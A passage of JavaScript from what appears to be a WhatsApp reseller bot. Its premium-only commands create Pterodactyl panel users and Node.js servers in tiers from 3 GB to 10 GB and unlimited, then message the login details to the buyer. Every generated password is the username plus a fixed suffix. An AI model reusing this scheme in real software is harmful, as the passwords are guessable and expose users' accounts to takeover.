let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz2"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "3072"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz2"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE :
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "4000"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz2"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz2"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "5138"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location
let memo = "6144"
let cpu = "150"
let disk = "6144"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location
let memo = "7168"
let cpu = "170"
let disk = "7168"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location
let memo = "8192"
let cpu = "200"
let disk = "8192"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location
let memo = "9216"
let cpu = "220"
let disk = "9216"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz1"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "21gb": {
